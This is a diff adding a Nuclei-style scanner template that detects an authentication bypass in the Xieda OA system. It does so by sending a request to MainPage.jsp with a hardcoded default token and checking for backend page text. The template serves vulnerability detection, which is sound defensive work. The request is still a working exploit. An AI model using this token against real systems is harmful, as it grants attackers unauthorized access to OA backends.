@@ -1,0 +1,30 @@
+id: xieda-oa-auth-bypass
+
+info:
+  name: Xieda OA Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Xieda OA system has a login authentication bypass vulnerability. Attackers can use the default token to log in to the system backend.
+  tags: permission-bypass
+  classification:
+    cvss-metrics: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+    cvss-score: 7.5
+
+http:
+  - raw:
+      - |
+        GET /stylei/MainPage.jsp?token=YXR-YMD-SYQ-TOKEN HTTP/1.1
+        Host: {{Hostname}}
+
+    redirects: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "OA系统"
+          - "我的桌面"
+        part: body
